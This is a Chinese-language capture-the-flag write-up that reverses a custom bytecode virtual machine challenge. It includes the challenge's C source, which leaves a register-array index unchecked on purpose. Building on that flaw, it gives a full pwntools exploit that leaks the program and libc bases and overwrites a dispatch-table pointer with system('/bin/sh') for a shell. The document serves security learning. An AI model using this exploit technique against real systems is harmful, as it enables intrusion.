# virtual machine

## 预分析

```bash
checksec vm
```
返回
```plain
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

没有 `canary` ，`got` 表可写，开启地址随机化保护。

运行一下

```plain
hello
and how to program?
---your code---
asas
---your code---
asasas
---your code---
```


附件中还给了一个 `libc.so.6` 的动态链接库，用 `strings` 查看其版本

```bash
strings libc.so.6 | grep ubuntu
```

返回

```plain
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.16) stable release version 2.31.
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

我们可以根据这个版本信息去搭建本地环境（当然，这不是刚需，尤其是你觉得不需要调试的时候）。搭建这个环境的作用是使得各函数在 `libc` 库中的**偏移**与服务端一致。

配置本地调试环境大家可以自行查询，关键词： `glibc-all-in-one` `patchelf` 

接下来使用 `ida64` 进行分析

## 逆向程序

根据题目提示，这是一台虚拟机，也可以在ida函数界面看到一些像是汇编指令一样的函数名，如 `jmp` `call` `push` 等。

观察 `main` 函数的主体部分，发现先是调用 `exec` 函数，传入了两个字节流，下面又将我们的输入传给 `exec` 函数，所以进入这个函数查看。

```C
__int64 __fastcall exec(__int64 a1, unsigned __int8 a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-8h]

  for ( i = 0LL; i <= 7; ++i )
    *(&ra)[i] = 0;
  memset(&sysmm, 0, 0x2B00uLL);
  load_ftable();
  load_text(a1, a2);
  return exec_text();
}
```

`a1` 由我们上面的分析，应该是要执行的命令的字符串， `a2` 现在还不知道，可以进入 `load_text` 查看。

```c
void *__fastcall load_text(const void *a1, unsigned __int8 a2)
{
  void *result; // rax

  result = memcpy(&unk_7300, a1, a2);
  r6 = 0;
  return result;
}
```

发现是将 `a1` copy 到 `&unk_7300` ，copy的字节数是 `a2` ，所以 `a2` 的含义应该是 `a1` 的长度，`exec` 原型应是 `exec(char* a1, uint8_t a2)` ，观察 `main` 函数，发现其实没有关于此处的漏洞。

`exec` 函数的前一部分是将一些东西初始化为0 ，主要分析后面三个函数 `load_ftable` `load_text` `exec_text`

下面是 `load_ftable` 

```c
__int64 (__fastcall *load_ftable())()
{
  __int64 (__fastcall *result)(); // rax

  memset(&unk_7400, 0, 0x800uLL);
  qword_7480 = (__int64)inc0;
  qword_7488 = (__int64)dec0;
  qword_7490 = (__int64)nop;
  qword_7498 = (__int64)ret;
  qword_7500 = (__int64)push;
  qword_7508 = (__int64)pop;
  qword_7530 = (__int64)nor;
  qword_7538 = (__int64)shl;
  qword_7540 = (__int64)pac;
  qword_7548 = (__int64)incr;
  qword_7550 = (__int64)decr;
  qword_7558 = (__int64)gac;
  qword_7600 = (__int64)add;
  qword_7608 = (__int64)or;
  qword_7610 = (__int64)xor;
  qword_7618 = (__int64)movrr;
  qword_7620 = (__int64)movmtr;
  qword_7628 = (__int64)movrtm;
  qword_7630 = (__int64)cmpl;
  qword_7638 = (__int64)cmps;
  qword_7640 = (__int64)cmpe;
  qword_7648 = (__int64)sub;
  qword_7700 = (__int64)ldr;
  qword_7800 = (__int64)call;
  qword_7808 = (__int64)jne;
  qword_7810 = (__int64)jns;
  qword_7818 = (__int64)jnl;
  qword_7820 = (__int64)jmp;
  qword_7828 = (__int64)jl;
  qword_7830 = (__int64)js;
  result = je;
  qword_7838 = (__int64)je;
  return result;
}
```


`load_ftable` 函数将一些函数地址写入了 `bss` 段的变量里。这些函数的功能在这里就不赘述了，主要是实现一些类似汇编指令的功能。从这些函数的分析中，我们可以看到一些被经常使用的变量，如 `r6` ，而且它自增的值似乎与**函数的参数个数**有关，可以推测其功能应该类似于 `eip` 寄存器。

`load_text` 只是进行了一个拷贝。

```c
void *__fastcall load_text(const void *a1, unsigned __int8 a2)
{
  void *result; // rax

  result = memcpy(&byte_7300, a1, a2);
  r6 = 0;
  return result;
}
```


下面是 `exec_text` 函数

{% raw %}
```c
__int64 exec_text()
{
  __int64 result; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = *(_QWORD *)&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480];
    if ( !result )
      break;
    result = (unsigned __int8)byte_7300[(unsigned __int16)r6];
    if ( !(_BYTE)result || i == 512 )
      break;
    if ( (unsigned __int8)byte_7300[(unsigned __int16)r6] <= 0xFu
      || (unsigned __int8)byte_7300[(unsigned __int16)r6] > 0x1Fu )
    {
      if ( (unsigned __int8)byte_7300[(unsigned __int16)r6] <= 0x1Fu
        || (unsigned __int8)byte_7300[(unsigned __int16)r6] > 0x3Fu )
      {
        if ( (unsigned __int8)byte_7300[(unsigned __int16)r6] <= 0x3Fu
          || (unsigned __int8)byte_7300[(unsigned __int16)r6] > 0x5Fu )
        {
          if ( byte_7300[(unsigned __int16)r6] < 96 )
          {
            if ( byte_7300[(unsigned __int16)r6] <= -113 )
              (*(void (__fastcall **)(_QWORD))&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480])((unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]);
          }
          else
          {
            (*(void (__fastcall **)(__int16 *, _QWORD))&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6]
                                                            + 4480])(
              (&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]],
              (unsigned __int16)((unsigned __int8)byte_7300[(unsigned __int16)r6 + 2]
                               + ((unsigned __int8)byte_7300[(unsigned __int16)r6 + 3] << 8)));
          }
        }
        else
        {
          (*(void (__fastcall **)(__int16 *, __int16 *))&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6]
                                                             + 4480])(
            (&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]],
            (&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 2]]);
        }
      }
      else
      {
        (*(void (__fastcall **)(__int16 *))&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480])((&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]]);
      }
    }
    else
    {
      (*(void (**)(void))&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480])();
    }
  }
  return result;
}
```
{% endraw %}


`exec_text` 函数中可以发现一个经常出现的变量 `byte_7300[(unsigned __int16)r6]` ，整个函数的大体含义是根据 `byte_7300[(unsigned __int16)r6]` 的值，执行 `&sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480])` 处的函数，不同条件函数传入的参数不同。

那么这个函数指针与之前那么多函数有什么关系呢？

`&sysmm` 的类型是 `_WORD` ，所以函数指针的地址应为

```plain
sysmm_offset + ( 4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480 ) * 2
```

其中 `sysmm` 的偏移为 `0x0000000000005100` ，与后面相加为

```plain
0x7400 + 8 * (unsigned __int8)byte_7300[(unsigned __int16)r6]
```

这便是函数指针的地址。

至于 `byte_7300` ，可以从函数 `load_text` 中看到，这是从我们的输入拷贝过来的，也就是说我们的输入决定了程序调用那个函数指针，而调用规则则由 `load_ftable` 函数进行加载。而且，这更加印证了 `r6` 相当于虚拟机的 `ip` 寄存器。

再分析这些函数调用的参数是什么。

发现与 `(unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480]` 有如下对应关系（改写成c）

```c
uint8_t one_byte = (unsigned __int8)byte_7300[(unsigned __int16)r6];

if (one_byte >= 0x10 && one_byte < 0x20) {
    (*(void (**)(void))&sysmm[4 * one_byte + 4480])();
    // 参数：无
}
else if (one_byte >= 0x20 && one_byte < 0x40) {
    (*(void (__fastcall **)(__int16 *))&sysmm[4 * one_byte + 4480])((&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]]);
    // 参数：one_byte 的下一个子节作为索引，在ra数组中的值，被解释为一个int16指针
}
else if (one_byte >= 0x40 && one_byte < 0x60) {
    (*(void (__fastcall **)(__int16 *, __int16 *))&sysmm[4 * one_byte + 4480])(
        (&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]],
        (&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 2]]
    );
    // 参数：one_byte 的下一个字节和再下一个字节为索引，在ra数组中的值，被解释为一个int16指针
}
else if (one_byte >= 0x60 && one_byte < 0x80) {
    (*(void (__fastcall **)(__int16 *, _QWORD))&sysmm[4 * one_byte + 4480])(
        (&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]],
        (unsigned __int16)((unsigned __int8)byte_7300[(unsigned __int16)r6 + 2] + ((unsigned __int8)byte_7300[(unsigned__int16)r6 + 3] << 8))
    );
    // 参数：1. one_byte 的下一个子节作为索引，在ra数组中的值，被解释为一个int16指针
    //       2. one_byte 下第二、第三个字节分别作为低位和高位拼接成的一个 int16类型的整数
}
else if (one_byte >= 0x80 && one_byte < 0x90) /*此处注意char类型的正负*/{
    (*(void (__fastcall **)(_QWORD))&sysmm[4 * one_byte + 4480])((unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]);
    //参数：直接传入 one_byte 的下一个字节作为参数
}
```

这里，我们其实可以结合前面的函数注意到，`ra` 实际上是一个指针数组，其内部储存着 `r0 ~ r7` 的地址。所以这里（`(&ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]]`）其实存在一个**数组越界漏洞**，即我们的输入值可以大于 `ra` 的最大索引 `7` ，从而实现一些事情。 

## 漏洞利用

首先，这个程序依据我们的输入，调用不同的函数指针，执行不同的代码，那么我们可以通过更改或向对应位置写入函数指针再通过输入调用该函数，便可实现函数的执行。

然后，我们要想利用 `libc` 中的 `system` 函数，需要泄露程序的 `libc` 基址，这就需要我们泄露 `got` 表中的值，但由于地址随机化，我们要想知道 `got` 表的地址，就需要知道程序加载的基址。显然的，`bss` 段上已经有一些已储存的函数指针，他们都指向 `text` 段，可以泄露程序基址。（使用函数`pac`，它能打印依据 `sysmm` 偏移的字节）

于是我们可以像编写汇编代码一样编写本虚拟机的代码。下面附上各函数的**指令**如下（即上面的 `one_byte` 值）：

```plain
0x10    inc0;
0x11    dec0;
0x12    nop;
0x13    ret;
0x20    push;
0x21    pop;
0x26    nor;
0x27    shl;
0x28    pac;
0x29    incr;
0x2a    decr;
0x2b    gac;
0x40    add;
0x41    or;
0x42    xor;
0x43    movrr;
0x44    movmtr;
0x45    movrtm;
0x46    cmpl;
0x47    cmps;
0x48    cmpe;
0x49    sub;
0x60    ldr;
0x80    call;
0x81    jne;
0x82    jns;
0x83    jnl;
0x84    jmp;
0x85    jl;
0x86    js;
0x87    je;
```

于是，我们可以编写代码

```python
payload1=b""
payload1+=b"\x60\x00\x08\x00" # ldr r0,0x0008
payload1+=b"\x60\x01"+(nop_f_addr_r-sysmm_addr_r).to_bytes(2,'little') # ldr r1, nop_offset
payload1+=b"\x28\x01" # pac, r1
payload1+=b"\x29\x01" # incr, r1
payload1+=b"\x11" # inc0
payload1+=b"\x48\x00\x02" # cmpe r0, r2  ; 此时r2为初始值，是0
payload1+=b"\x81\x08" # je 0x08
```

上面代码通过循环实现了打印 `nop` 这个函数指针，这个指针减去 `ida` 中可以查看到的偏移即为程序基址

```python
payload2=b""
payload2+=b"\x60\x01"+((puts_plt&0xffff)).to_bytes(2,'little')
payload2+=b"\x60\x00"+(puts_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload2+=b"\x45\x00\x01" # movrtm r0, r1 ; 看清源操作数和目的操作数
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((puts_plt>>16)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((puts_plt>>32)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x60\x01"+(putchar_got&0xffff).to_bytes(2,'little')
payload2+=b"\x60\x00\x00\x00" 
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((putchar_got>>16)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((putchar_got>>32)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x2c"+((sysmm_addr_r-ra_addr_r)//8).to_bytes(1,'little') # 利用了数组越界漏洞，打印了 ra[8]
```

这段代码主要实现了将 `puts` 的 `plt` 表地址复制到指令 `0x2c` 所对应的内存处，即程序中变量 `puts_f_addr_r` ，再调用 `puts` 函数打印出 `putchar` 的 `got` 表，从而泄露 `libc` 基址。

```python
payload3=b""
payload3+=b"\x60\x01"+((system_addr&0xffff)).to_bytes(2,'little')
payload3+=b"\x60\x00"+(puts_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((system_addr>>16)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((system_addr>>32)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x60\x01"+(abinsh_addr&0xffff).to_bytes(2,'little')
payload3+=b"\x60\x00\x00\x00"
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((abinsh_addr>>16)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((abinsh_addr>>32)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x2c"+((sysmm_addr_r-ra_addr_r)//8).to_bytes(1,'little')
```

这段代码现将计算得到的 `system` 函数地址写入 `0x2c` 指令所在地址，在调用该函数，实现 `getshell` 。这里同样利用了和 `payload2` 一样的**数组越界漏洞**（`ra`数组）

下面是完整exp

```python
from pwn import *
ip='test ip'     # test ip
port=9999           # test port
conn=connect(ip,port)

libc=ELF("/home/kali/ctf/task/VM/virtual_machine/src/libc.so.6")    #load libc

system_libc=libc.sym['system']
putchar_libc=libc.sym['putchar']
abinsh_libc=libc.search(b'/bin/sh').__next__()

puts_plt_r=0x00000000000010D0
putchar_got_r=0x0000000000005018
nop_addr_r=0x0000000000001D1D
nop_f_addr_r=0x0000000000007490
sysmm_addr_r=0x0000000000005100
ra_addr_r=0x0000000000005080
puts_f_addr_r=0x7560    # where we want puts' address to be stored


# leak .text base address
payload1=b""
payload1+=b"\x60\x00\x08\x00"
payload1+=b"\x60\x01"+(nop_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload1+=b"\x28\x01"
payload1+=b"\x29\x01"
payload1+=b"\x11"
payload1+=b"\x48\x00\x02"
payload1+=b"\x81\x08"

conn.recvline()
conn.recvline()
conn.recvline()
conn.sendline(payload1)

nop_addr=int.from_bytes(conn.recvline()[0:8],'little')
text_base=nop_addr-nop_addr_r


putchar_got=putchar_got_r+text_base
puts_plt=puts_plt_r+text_base


# leak libc base
payload2=b""
payload2+=b"\x60\x01"+((puts_plt&0xffff)).to_bytes(2,'little')
payload2+=b"\x60\x00"+(puts_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((puts_plt>>16)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((puts_plt>>32)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x60\x01"+(putchar_got&0xffff).to_bytes(2,'little')
payload2+=b"\x60\x00\x00\x00"
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((putchar_got>>16)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x10\x10"
payload2+=b"\x60\x01"+((putchar_got>>32)&0xffff).to_bytes(2,'little')
payload2+=b"\x45\x00\x01"
payload2+=b"\x2c"+((sysmm_addr_r-ra_addr_r)//8).to_bytes(1,'little')

conn.sendline(payload2)
putchar_addr=int.from_bytes(conn.recvline()[:-1],'little')

libcbase=putchar_addr-putchar_libc
system_addr=libcbase+system_libc
abinsh_addr=libcbase+abinsh_libc

# system("/bin/sh")
payload3=b""
payload3+=b"\x60\x01"+((system_addr&0xffff)).to_bytes(2,'little')
payload3+=b"\x60\x00"+(puts_f_addr_r-sysmm_addr_r).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((system_addr>>16)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((system_addr>>32)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x60\x01"+(abinsh_addr&0xffff).to_bytes(2,'little')
payload3+=b"\x60\x00\x00\x00"
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((abinsh_addr>>16)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x10\x10"
payload3+=b"\x60\x01"+((abinsh_addr>>32)&0xffff).to_bytes(2,'little')
payload3+=b"\x45\x00\x01"
payload3+=b"\x2c"+((sysmm_addr_r-ra_addr_r)//8).to_bytes(1,'little')

conn.recvuntil("---your code---\n")
conn.sendline(payload3)
conn.interactive()
```

## 程序源码

`vm.c`

{% raw %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "memory.h"
#include "operator.h"
#include "registers.h"

#define MIN(x,y) (((x)<(y))?(x):(y))

void exec(char* buf,uint8_t buf_size){
    for (size_t i = 0; i < RNUM; i++)
    {
        *(ra[i])=0;
    }
    
    memset((char*)&sysmm,0,sizeof(sysmm));
    load_ftable();
    load_text(buf,MIN(buf_size,sizeof(sysmm.text)));
    exec_text();
}

int main(int argc, char const *argv[])
{
    // char ii[2]={0x1,0x2};
    // vm_init();
    // vm_process(ii);
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);

    char code[]="\x60\x01he\x60\x00\x00\x02\x45\x00\x01\x10\x10"
    "\x60\x01ll\x45\x00\x01\x10\x10"
    "\x60\x01o\x0a\x45\x00\x01\x10\x10"
    "\x60\x02\x00\x02\x49\x00\x02\x28\x02\x11\x29\x02\x48\x00\x03\x81\x26\x10\x11";
    
    exec(code,sizeof(code));
    // load_ftable();
    // load_text(code,MIN(sizeof(code),sizeof(sysmm.text)));
    // exec_text();


    char code2[]="\x60\x01\x61\x6e\x60\x00\x00\x02\x45\x00\x01\x10\x10"
    "\x60\x01\x64\x20\x45\x00\x01\x10\x10"
    "\x60\x01\x68\x6f\x45\x00\x01\x10\x10"
    "\x60\x01\x77\x20\x45\x00\x01\x10\x10"
    "\x60\x01\x74\x6f\x45\x00\x01\x10\x10"
    "\x60\x01\x20\x70\x45\x00\x01\x10\x10"
    "\x60\x01\x72\x6f\x45\x00\x01\x10\x10"
    "\x60\x01\x67\x72\x45\x00\x01\x10\x10"
    "\x60\x01\x61\x6d\x45\x00\x01\x10\x10"
    "\x60\x01\x3f\x0a\x45\x00\x01\x10\x10"
    "\x60\x02\x00\x02\x49\x00\x02"
    "\x28\x02\x11\x29\x02\x48\x00\x03\x81\x65\x00";

    exec(code2,sizeof(code2));

    char your_code[256]={0};

    while (1)
    {
        puts("---your code---");
        fgets(your_code,256,stdin);
        exec(your_code,255);
    }
    

    return 0;
}
```
{% endraw %}

`registers.c`

```c
#include <stdint.h>
#include "memory.h"
#include "registers.h"

uint16_t r0=0;
uint16_t r1=0;
uint16_t r2=0;
uint16_t r3=0;
uint16_t r4=0;
uint16_t r5=0;
uint16_t r6=0;
uint16_t r7=0;

uint16_t* ra[RNUM]={&r0,&r1,&r2,&r3,&r4,&r5,&r6,&r7};
```

`registers.h`

```c
#ifndef REGISTERS_H
#define REGISTERS_H

#include <stdint.h>

#define R(i) (r##i)
#define RNUM 8

extern uint16_t r0;
extern uint16_t r1;
extern uint16_t r2;
extern uint16_t r3;
extern uint16_t r4;
extern uint16_t r5;
extern uint16_t r6;
extern uint16_t r7;
extern uint16_t* ra[RNUM];

#endif
```

`operator.c`

```c
#include <stdint.h>
#include <stdio.h>
#include "operator.h"
#include "memory.h"
#include "registers.h"

void inc0(){
    r0++;
    r6++;
}

void dec0(){
    r0--;
    r6++;
}

void nop(){
    r6++;;
}

void ret(){
    pop(&r6);
}


void push(uint16_t* r){
    sysmm.stack[r7]=*r;
    r7++;
    r6++;
    r6++;
}

void pop(uint16_t* r){
    r7--;
    *r=sysmm.stack[r7];
    r6++;
    r6++;
}

void jmp(uint8_t n){
    r6=n;
}

void jl(uint8_t n){
    r6=(r5==3)?(n):(r6+2);
}

void js(uint8_t n){
    r6=(r5==1)?(n):(r6+2);
}

void je(uint8_t n){
    r6=(r5==2)?(n):(r6+2);
}

void nor(uint16_t* r){
    *r=~(*r);
    r6++;
    r6++;
}


void shl(uint16_t* r){
    *r=(*r)<<1;
    r6++;
    r6++;
}

void pac(uint16_t* r){
    putchar(((uint8_t*)(&sysmm))[*r]);
    r6++;
    r6++;
}

void incr(uint16_t* r){
    (*r)++;
    r6++;
    r6++;
}

void decr(uint16_t* r){
    (*r)--;
    r6++;
    r6++;
}


void gac(uint16_t* r){
    ((uint8_t*)(&sysmm))[*r]=getchar();
    r6++;
    r6++;
}


void add(uint16_t* rd,uint16_t* rs){
    *rd=(*rd)+(*rs);
    r6++;
    r6++;
    r6++;
}


void and(uint16_t* rd,uint16_t* rs){
    *rd=(*rd)&(*rs);
    r6++;
    r6++;
    r6++;
}


void or(uint16_t* rd,uint16_t* rs){
    *rd=(*rd)|(*rs);
    r6++;
    r6++;
    r6++;
}

void xor(uint16_t* rd,uint16_t* rs){
    *rd=(*rd)^(*rs);
    r6++;
    r6++;
    r6++;
}

void movrr(uint16_t* rd,uint16_t* rs){
    *rd=*rs;
    r6++;
    r6++;
    r6++;
}

void movmtr(uint16_t* rd,uint16_t* rs){
    *rd=((uint8_t*)(&sysmm))[*rs]+((uint8_t*)(&sysmm))[*rs+1]<<8;
    r6++;
    r6++;
    r6++;
}

void movrtm(uint16_t* rd,uint16_t* rs){
    ((uint8_t*)(&sysmm))[*rd]=LOBYTE(*rs);
    ((uint8_t*)(&sysmm))[*rd+1]=HIBYTE(*rs);
    r6++;
    r6++;
    r6++;
}

void cmpl(uint16_t* rd,uint16_t* rs){
    r5=(*rd>*rs)?3:0;
    r6++;
    r6++;
    r6++;
}

void cmps(uint16_t* rd,uint16_t* rs){
    r5=(*rd<*rs)?1:0;
    r6++;
    r6++;
    r6++;

}

void cmpe(uint16_t* rd, uint16_t* rs){
    r5=(*rd==*rs)?2:0;
    r6++;
    r6++;
    r6++;
}

void sub(uint16_t* rd,uint16_t* rs){
    *rd=(*rd)-(*rs);
    r6++;
    r6++;
    r6++;
}

void ldr(uint16_t* rd,uint16_t n){
    (*rd)=n;
    r6+=4;
}

void call(uint8_t n){
    push(&r6);
    r6=(uint16_t)n;
}

void jne(uint8_t n){
    r6=(r5!=2)?(n):(r6+2);
}

void jns(uint8_t n){
    r6=(r5!=1)?(n):(r6+2);
}

void jnl(uint8_t n){
    r6=(r5!=3)?(n):(r6+2);
}
```

`operator.h`

```c
#ifndef OPERATOR_H
#define OPERATOR_H

#define HIBYTE(r) (((r)>>8)&0xff)
#define LOBYTE(r) ((r)&0xff)

typedef void (*op_a0)();
typedef void (*op_a1)(uint16_t*);
typedef void (*op_a2)(uint16_t*,uint16_t*);
typedef void (*op_rn)(uint16_t*,uint16_t);
typedef void (*op_n)(uint8_t);

void inc0();
void dec0();
void nop();
void ret();
void push(uint16_t* r);
void pop(uint16_t* r);
void jmp(uint8_t n);
void jl(uint8_t n);
void js(uint8_t n);
void je(uint8_t n);
void nor(uint16_t* r);
void shl(uint16_t* r);
void pac(uint16_t* r);
void incr(uint16_t* r);
void decr(uint16_t* r);
void gac(uint16_t* r);
void jne(uint8_t n);
void jns(uint8_t n);
void jnl(uint8_t n);
void add(uint16_t* rd,uint16_t* rs);
void and(uint16_t* rd,uint16_t* rs);
void or(uint16_t* rd,uint16_t* rs);
void xor(uint16_t* rd,uint16_t* rs);
void movrr(uint16_t* rd,uint16_t* rs);
void movmtr(uint16_t* rd,uint16_t* rs);
void movrtm(uint16_t* rd,uint16_t* rs);
void cmpl(uint16_t* rd,uint16_t* rs);
void cmps(uint16_t* rd,uint16_t* rs);
void cmpe(uint16_t* rd, uint16_t* rs);
void sub(uint16_t* rd,uint16_t* rs);
void ldr(uint16_t* rd,uint16_t n);
void call(uint8_t n);

#endif
```

`memory.c`

{% raw %}
```c
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "memory.h"
#include "operator.h"
#include "registers.h"

// uint16_t stack[STACK_SIZE]={0};

mm sysmm;

void load_text(uint8_t* buf,uint8_t n){
    memcpy(sysmm.text,buf,n);
    r6=0;
}

void load_ftable(){
    memset(sysmm.ftable,0,sizeof(sysmm.ftable));
    sysmm.ftable[0x10]=(uint64_t)inc0;
    sysmm.ftable[0x11]=(uint64_t)dec0;
    sysmm.ftable[0x12]=(uint64_t)nop;
    sysmm.ftable[0x13]=(uint64_t)ret;
    // sysmm.ftable[0x14]=(uint64_t)debug;
    sysmm.ftable[0x20]=(uint64_t)push;
    sysmm.ftable[0x21]=(uint64_t)pop;
    // sysmm.ftable[0x22]=jmp;
    // sysmm.ftable[0x23]=jl;
    // sysmm.ftable[0x24]=js;
    // sysmm.ftable[0x25]=je;
    sysmm.ftable[0x26]=(uint64_t)nor;
    sysmm.ftable[0x27]=(uint64_t)shl;
    sysmm.ftable[0x28]=(uint64_t)pac;
    sysmm.ftable[0x29]=(uint64_t)incr;
    sysmm.ftable[0x2a]=(uint64_t)decr;
    sysmm.ftable[0x2b]=(uint64_t)gac;
    // sysmm.ftable[0x2c]=jns;
    // sysmm.ftable[0x2d]=jnl;
    sysmm.ftable[0x40]=(uint64_t)add;
    sysmm.ftable[0x41]=(uint64_t)or;
    sysmm.ftable[0x42]=(uint64_t)xor;
    sysmm.ftable[0x43]=(uint64_t)movrr;
    sysmm.ftable[0x44]=(uint64_t)movmtr;
    sysmm.ftable[0x45]=(uint64_t)movrtm;
    sysmm.ftable[0x46]=(uint64_t)cmpl;
    sysmm.ftable[0x47]=(uint64_t)cmps;
    sysmm.ftable[0x48]=(uint64_t)cmpe;
    sysmm.ftable[0x49]=(uint64_t)sub;
    sysmm.ftable[0x60]=(uint64_t)ldr;
    sysmm.ftable[0x80]=(uint64_t)call;
    sysmm.ftable[0x81]=(uint64_t)jne;
    sysmm.ftable[0x82]=(uint64_t)jns;
    sysmm.ftable[0x83]=(uint64_t)jnl;
    sysmm.ftable[0x84]=(uint64_t)jmp;
    sysmm.ftable[0x85]=(uint64_t)jl;
    sysmm.ftable[0x86]=(uint64_t)js;
    sysmm.ftable[0x87]=(uint64_t)je;
}

void exec_text(){
    int i=0;
    while (sysmm.ftable[sysmm.text[r6]]!=0&&sysmm.text[r6]!=0&&i!=0x200)
    {
        i++;
        if (sysmm.text[r6]>=0x10&&sysmm.text[r6]<0x20)
        {
            ((op_a0)sysmm.ftable[sysmm.text[r6]])();
        }
        else if (sysmm.text[r6]>=0x20&&sysmm.text[r6]<0x40)
        {
            ((op_a1)sysmm.ftable[sysmm.text[r6]])(ra[sysmm.text[r6+1]]);
        }
        else if (sysmm.text[r6]>=0x40&&sysmm.text[r6]<0x60)
        {
            ((op_a2)sysmm.ftable[sysmm.text[r6]])(ra[sysmm.text[r6+1]],ra[sysmm.text[r6+2]]);
        }
        else if (sysmm.text[r6]>=0x60&&sysmm.text[r6]<0x80)
        {
            ((op_rn)sysmm.ftable[sysmm.text[r6]])(ra[sysmm.text[r6+1]],sysmm.text[r6+2]+(sysmm.text[r6+3]<<8));
        }
        else if (sysmm.text[r6]>=0x80&&sysmm.text[r6]<0x90)
        {
            ((op_n)sysmm.ftable[sysmm.text[r6]])(sysmm.text[r6+1]);
        }
        
        // debug();
        
    }
    
}


void debug(){
    printf("-------------\n");
    for (size_t i = 0; i < RNUM; i++)
    {
        printf("r%d=%d\n",i,*ra[i]);
    }
    // r6++;
    
}
```
{% endraw %}

`memory.h`

```c
#ifndef STACK_H
#define STACK_H
#include <stdint.h>

#define STACK_SIZE 0x100
#define GLOBAL_SIZE 0x1000
#define TEXT_SIZE 0x100
#define FTABLE_SIZE 0x100


// extern uint16_t stack[STACK_SIZE];
typedef struct memory
{
    uint16_t stack[STACK_SIZE];
    uint16_t global[GLOBAL_SIZE];
    uint8_t text[TEXT_SIZE];
    uint64_t ftable[FTABLE_SIZE];
}mm;

extern mm sysmm;

void load_text(uint8_t* buf,uint8_t n);
void load_ftable();
void exec_text();
void debug();

#endif
```

编译

```bash
gcc vm.c memory.c operator.c registers.c -o vm -z lazy
```

编译环境

ubuntu20.04标准镜像







